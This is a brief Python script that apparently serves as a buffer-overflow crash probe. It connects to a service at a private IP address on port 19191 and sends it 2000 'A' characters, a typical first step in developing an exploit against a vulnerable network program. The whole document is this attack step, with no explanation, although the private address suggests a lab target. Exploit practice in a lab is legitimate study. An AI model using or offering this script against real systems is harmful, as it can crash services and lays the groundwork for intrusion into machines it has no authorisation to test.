import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

host = "192.168.1.130"
port = 19191

sock.connect((host, port))

buffer = "A"*2000
sock.send(buffer)

sock.close()
